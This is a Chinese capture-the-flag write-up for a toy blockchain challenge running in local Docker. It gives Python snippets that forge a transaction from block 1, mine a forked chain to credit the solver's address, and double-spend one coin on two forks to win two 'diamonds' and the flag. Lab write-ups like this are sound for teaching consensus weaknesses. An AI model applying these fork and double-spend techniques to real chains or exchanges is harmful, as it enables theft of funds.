# 1、环境准备
+ cd到有dockerfile到目录创建容器

```plain
docker build -t mini_blockchain .
```

+ 运行docker容器

```plain
docker run -it -p 5001:5000 mini_blockchain
```

    - -it：显示日志
    - -p：指定映射到本机的5001端口，容器使用默认5000端口

## 2、修改自己的url
```plain
url_base = 'http://127.0.0.1:5001/b9af31f66147e'  # 需要选一个valid prefix
```

# 查看原链信息
## 调用api（'/'）
+ 使用方法`parse_home()`对接收到的返回json信息进行解析，得到不同信息

```plain
text = s.get(url_base + '/').text
genesis_block_hash, bank_address, _, shop_address, blocks, _ = parse_home(text)
```

+ 得到原始的链上信息：

```plain
{
  "创世区块哈希": "151e3962df3abb53f36f5697b5d8d53f9800e02014cef0e4820042275b81b682",
  
  "角色地址": {
    "bank_addr":   "8048386051256e230b5cbd5fa0c9594c39ca0ea96170654a32374b3cd9e379e4740d23f1544a118161d2bbeb07ea336f",  // 银行
    "hacker_addr": "b2ad5ec49ea74f33d9a8ffc0070906bf0d77ad045778f70672f1257b3538013723e24ea48ef3c1827381712c224b5571",  // 黑客
    "shop_addr":   "963258fe699bae56a13d7318186778ba0a061448d4bfd51c7efb17c0a096eea5150a33fa7b47794154853956a9aa6f65"   // 商店
  },
  
  "余额": {  // 键=地址，值=余额
    "86936381b3c1e90f6cf4225e11b14130b19a1869f1eecf4e873b57878b49ba4299bb1fa7e1a68f4f95368f3c3e76f2cf": 999999,  // 黑客新地址
    "b2ad5ec49ea74f33d9a8ffc0070906bf0d77ad045778f70672f1257b3538013723e24ea48ef3c1827381712c224b5571": 0,
    "963258fe699bae56a13d7318186778ba0a061448d4bfd51c7efb17c0a096eea5150a33fa7b47794154853956a9aa6f65": 0,
    "b437074caf9b586db4936f4dea1159b1c2b493eff464ae04bfb73eda3735403b9ef31c462b04a32981c8d68a02e73a71": 1,      // 矿工找零
    "8048386051256e230b5cbd5fa0c9594c39ca0ea96170654a32374b3cd9e379e4740d23f1544a118161d2bbeb07ea336f": 0
  },
  
  "UTXO": {  // 键=UTXO_ID，值=详情
    "332a0969-780c-4b80-857b-05ab7e15aa26": {
      "amount": 999999,
      "hash":   "712bc641b288aa14b438d59a9651ec4983b8c32fea520f1a0523475b6edf1b2b",
      "addr":   "86936381b3c1e90f6cf4225e11b14130b19a1869f1eecf4e873b57878b49ba4299bb1fa7e1a68f4f95368f3c3e76f2cf",
      "id":     "332a0969-780c-4b80-857b-05ab7e15aa26"
    },
    "5b91c93e-cc5e-4daa-a36a-04ff01ed00de": {
      "amount": 1,
      "hash":   "5a19bf967b1d63e3606b4f6ca687a12b75dd91f0f140260e803f693fb0daf414",
      "addr":   "b437074caf9b586db4936f4dea1159b1c2b493eff464ae04bfb73eda3735403b9ef31c462b04a32981c8d68a02e73a71",
      "id":     "5b91c93e-cc5e-4daa-a36a-04ff01ed00de"
    }
  },
  
  "区块链浏览器": {  // 键=区块哈希
    "151e3962df3abb53f36f5697b5d8d53f9800e02014cef0e4820042275b81b682": {  // 创世块
      "height": 0,
      "prev":   "0000000000000000000000000000000000000000000000000000000000000000",
      "nonce":  "The Times 03/Jan/2009 Chancellor on brink of second bailout for bank",
      "tx": [{
        "hash": "632204b957b6046ce21d4b64af85ffb0b7a698fa33ca24a0d7a356874719c3be",
        "input": [], "signature": [],
        "output": [{
          "id":     "0e241d7f-2830-4588-bf8b-9e2138f70a8d",
          "amount": 1000000,
          "addr":   "b437074caf9b586db4936f4dea1159b1c2b493eff464ae04bfb73eda3735403b9ef31c462b04a32981c8d68a02e73a71"
        }]
      }]
    },
    "3be99bf658c137e4449ffd0cb29f30600160a9c1fb22ed95ca3f347b9ae1071d": {  // 高度1，黑客转账
      "height": 1,
      "prev":   "151e3962df3abb53f36f5697b5d8d53f9800e02014cef0e4820042275b81b682",
      "nonce":  "HAHA, I AM THE BANK NOW!",
      "tx": [{
        "hash": "9f29d61c3e1f17f9c87142a2a354c48d4b2cbc862f8659db05669be0fb51f784",
        "input": ["0e241d7f-2830-4588-bf8b-9e2138f70a8d"],
        "signature": ["91e6c3326cb67a063d7c95e44217dcfb8130ba696f97ea6b4f447a38a7fc6115c16f57e62b647d38a5a6990daf7f3e42"],
        "output": [
          { "id": "332a0969-780c-4b80-857b-05ab7e15aa26", "amount": 999999, "addr": "86936381b3c1e90f6cf4225e11b14130b19a1869f1eecf4e873b57878b49ba4299bb1fa7e1a68f4f95368f3c3e76f2cf" },
          { "id": "5b91c93e-cc5e-4daa-a36a-04ff01ed00de", "amount": 1,      "addr": "b437074caf9b586db4936f4dea1159b1c2b493eff464ae04bfb73eda3735403b9ef31c462b04a32981c8d68a02e73a71" }
        ]
      }]
    },
    "fa2964fc0e19fec750da2e96d7d963ab0643e8ab82ba211293a91606ef0a72d5": {  // 空块
      "height": 2,
      "prev":   "3be99bf658c137e4449ffd0cb29f30600160a9c1fb22ed95ca3f347b9ae1071d",
      "nonce":  "a empty block",
      "tx": []
    }
  }
}
```

# 通过改造创世区块后的第二区块并制造分叉获取余额
```plain
attacked_block = next(b for b in blocks.values() if b['height'] == 1)
    for b in blocks.values():
        if b['height'] == 1:
            attacked_block = b
            break
```

## 1、复制并修改这一区块中的交易信息
```plain
replayed_tx = json.loads(json.dumps(attacked_block['transactions'][0]))  # 深拷贝
replayed_tx['output'] = [create_output_utxo(my_address, 1000000)]
replayed_tx['hash'] = hash_tx(replayed_tx)
```

## 2、调用`mine-block`方法，创造伪造的分叉区块使我们的地址有1000000余额
```plain
forked_block = mine_block(genesis_block_hash, [replayed_tx])
```

+ `mine-block`方法

```plain
DIFFICULTY = int('00000' + 'f' * 59, 16)
def mine_block(prev, transactions, difficulty=DIFFICULTY, nonce_prefix=''):
    nonce = 0
    while True:
        block = create_block(prev, nonce_prefix + str(nonce), transactions)
        block_hash_int = int(block['hash'], 16)
        if block_hash_int <= difficulty:
            return block
        nonce += 1
        if nonce % 100000 == 0:
            print(f"Mining... tried {nonce} nonces")  # 进度显示
```

+ Difficulty的值在serve.py的append_block的方法中可以找到

```plain
def append_block(block, difficulty=int('f'*64, 16)):
```

```plain
if block_hash > difficulty: raise Exception('Please provide a valid Proof-of-Work')
```

## 3、调用`/create_transaction`api将伪造的区块接到创世区块后
```plain
r = s.post(url_base + '/create_transaction', data=json.dumps(forked_block))
```

## 4、在伪造区块后创造两个空块使伪造块生效
```plain
prev = forked_block['hash']
    for i in range(2):
        empty_block = mine_block(prev, [])
        r = s.post(url_base + '/create_transaction', data=json.dumps(empty_block))
        prev = empty_block['hash']
```

## 5、生效后可以从返回的链上信息中找到属于我们地址的utxo
![](https://cdn.nlark.com/yuque/0/2025/png/25927408/1762860134677-84f552ec-ff9f-4ef4-a6e3-e3aae013fcca.png)

# 使用获得的余额买第一颗钻石
## 1、创建交易块
```plain
output_to_shop = create_output_utxo(shop_address, 1000000)
tx_to_shop1 = create_tx([utxo_to_double_spend], [output_to_shop], my_privkey)
spend_block1 = mine_block(fork_point_prev, [tx_to_shop1]) 
r = s.post(url_base + '/create_transaction', data=json.dumps(spend_block1))
```

+ 方法`create_tx`

```plain
def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
```

## 2、服务器在`/create_transactin`的api中包含有判定能否获得钻石的方法：
```plain
balance, utxos, tail = get_balance_of_all()
	if balance[shop_address] == 1000000:
		# when 1000000 DDCoins are received, the shop will give you a diamond
		session['your_diamonds'] += 1
		# and immediately the shop will store the money somewhere safe.
		transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)
		new_block = create_block(tail['hash'], 'save the DDCoins in a cold wallet', [transferred])
		append_block(new_block)
		msg += ' You receive a diamond.'
	return msg
```

+ 当发现可以获得钻石后，服务器会自动创建一个新的块转移shop获得的余额

```plain
def create_block(prev_block_hash, nonce_str, transactions)
```

## 3、调用api后满足条件获得钻石：
![](https://cdn.nlark.com/yuque/0/2025/png/25927408/1762862050524-8edc187f-f295-4372-9eb5-440f26eb9d3e.png)

# 创造分叉获得第二颗钻石
## 1、创造一个和第一颗钻石交易一样的块并接在交易第一颗钻石的块之后
```plain
output_to_shop = create_output_utxo(shop_address, 1000000)
    tx_to_shop2 = create_tx([utxo_to_double_spend], [output_to_shop], my_privkey)
    spend_block2 = mine_block(fork_point_prev, [tx_to_shop2], nonce_prefix='another-chain-nonce-')
    r = s.post(url_base + '/create_transaction', data=json.dumps(spend_block2))
```

## 2、在该交易所在的块后创建两个空块，使服务器判断该链为最长链，送出钻石
```plain
prev = spend_block2['hash']
    for i in range(2):  # 至少 2 个空块
        empty_block = mine_block(prev, [])
        r = s.post(url_base + '/create_transaction', data=json.dumps(empty_block))
        prev = empty_block['hash']
```

## 3、得到第二颗钻石：
![](https://cdn.nlark.com/yuque/0/2025/png/25927408/1762862677830-a83ba33d-5510-4612-9ce6-27a93f07bf6a.png)

# 调用`/flag`接口获得旗帜
![](https://cdn.nlark.com/yuque/0/2025/png/25927408/1762862729295-00fdeb32-93c0-43b3-a92d-9bfdfaa8203f.png)





